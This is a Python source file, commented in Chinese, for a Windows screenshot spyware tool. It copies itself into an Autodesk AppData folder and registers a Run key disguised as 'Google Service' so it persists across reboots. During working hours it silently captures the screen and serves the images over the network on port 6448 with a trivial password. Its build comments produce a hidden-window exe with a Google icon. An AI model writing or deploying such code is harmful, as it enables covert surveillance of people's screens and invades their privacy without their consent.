# -*- coding:utf-8 -*-
import time
from shutil import copyfile
from PIL import ImageGrab
from multiprocessing.managers import BaseManager
from multiprocessing import Queue, freeze_support
from win32api import RegOpenKey, RegSetValueEx, RegCloseKey, RegOpenKeyEx, RegEnumValue
from win32con import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
from os import path, listdir, remove
from socket import gethostname, gethostbyname


# 从BaseManager继承的QueueManager:
class QueueManager(BaseManager):
    pass


class AutoCam:
    def __init__(self):
        # 发送任务的队列:储存图片（目标机）
        self.task_queue = Queue()

    def return_task_queue(self):
        return self.task_queue  # 返回发送任务队列

    def runFunction(self):
        self.AutoRun()
        hostname = gethostname()
        targetIp = gethostbyname(hostname)
        QueueManager.register(
            'get_task_queue', callable=self.return_task_queue)
        # 绑定端口6448，设置验证密码'abc',要用byte格式
        manager = QueueManager(address=(targetIp, 6448), authkey=b'abc')
        # 启动Queue
        manager.start()
        # 通过网络获取Queue对象
        task = manager.get_task_queue()
        # 调用imageDo函数把图像数据放入队列
        self.imageDo(task)
        manager.shutdown()
        print('master has been shoutDown')

    @staticmethod
    def AutoRun():  # 自动拷贝并使文件开机自动运行
        alwaysFileName = path.basename(__file__)
        alwaysFileName = alwaysFileName.split('.')[0]
        nowPyPath = path.abspath(path.dirname(__file__))
        nowExeName = path.abspath(path.dirname(
            __file__)) + '\\' + alwaysFileName + '.exe'
        newExeFilePath = 'C:\\Users\\Administrator\\AppData\\Local\\Autodesk\\' + \
                         alwaysFileName + '.exe'    # 变成exe后，name还是.py,所以要手动加exe
        if nowPyPath != 'C:\\Users\\Administrator\\AppData\\Local\\Autodesk\\':  # 如果文件位置不是Autodesk的位置
            try:
                copyfile(nowExeName, newExeFilePath)  # 复制文件到指定目录
                print('复制成功')
            except Exception as e:
                print(e)

        KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'  # 注册表项名
        keyEnum = RegOpenKeyEx(HKEY_CURRENT_USER,
                             'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, KEY_ALL_ACCESS)
        ifValueExist = False
        try:    # 判断要注入的键值是否存在
            i = 0
            while True:
                regValue=RegEnumValue(keyEnum, i)
                if regValue[0] == 'Google Service':
                    ifValueExist = True
                    print('键值已存在')
                i += 1
        except:
            pass

        if not ifValueExist:
            try:
                key = RegOpenKey(HKEY_CURRENT_USER, KeyName, 0, KEY_ALL_ACCESS)
                RegSetValueEx(key, 'Google Service', 0, REG_SZ, newExeFilePath)
                RegCloseKey(key)
                print('添加成功！')
            except Exception as e:
                print(e)

    @staticmethod
    def imageDo(imageQueue):  # 放图片至队列当中
        while True:
            imFileName = time.strftime(
                '%Y_%m_%d_%H_%M_%S', time.localtime(time.time()))
            nowHour = imFileName.split('_')[3]
            if 9 <= int(nowHour) <= 17:  # 上班时间段
                # imagePath = 'C:\\Users\\Administrator\\AppData\\Local\\Autodesk\\'
                # imFilePath = imagePath + imFileName + '.jpg'
                img = ImageGrab.grab()
                # img.save(imFilePath, quality=95)
                imageQueue.put(img)
                # print(img)
                # fileName = listdir(imagePath)
                # if len(fileName) > 2:
                #     for each in fileName:
                #         if each.split('.')[-1] == 'jpg':
                #             remove(imagePath + each)
                if imageQueue.qsize() > 48:     # 当队列元素数量超过48时，取一部分出来
                    for j in range(imageQueue.qsize() - 2):
                        imageQueue.get()
                time.sleep(600)  # 两分钟截一次
            else:  # 不然就等到第二天九点
                time.sleep(600)


if __name__ == '__main__':
    freeze_support()
    AutoCam().runFunction()
# pyinstaller -i google.ico -F -w Google_Skype.py
# pyinstaller -i google.ico -F -w imageGrabManager.py
